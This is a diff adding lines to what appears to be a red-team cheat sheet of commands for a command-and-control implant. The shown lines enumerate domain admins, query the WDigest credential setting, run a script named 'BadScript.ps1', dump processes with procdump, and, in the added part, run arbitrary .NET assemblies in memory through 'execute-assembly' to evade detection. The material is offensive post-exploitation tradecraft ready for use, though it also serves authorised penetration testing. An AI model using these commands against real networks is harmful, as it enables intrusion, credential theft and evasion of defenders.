@@ -68,6 +68,13 @@ execute -o net group "domain admins" /domain
 execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
 // Execute powershell to run a powershell script
 execute -o powershell "c:\Windows\Temp\BadScript.ps1"
+// Execute assemble 
+// runs any .NET assembly!
+// as a executable or DLL in memory either in sacrificial or the implant process
+execute-assembly -s -i $localpath/Tool.exe -- -$flagsAndArgsOfTool
+
+
+
 // Process and dumping processes
 ps 
 procdump -p <PID>
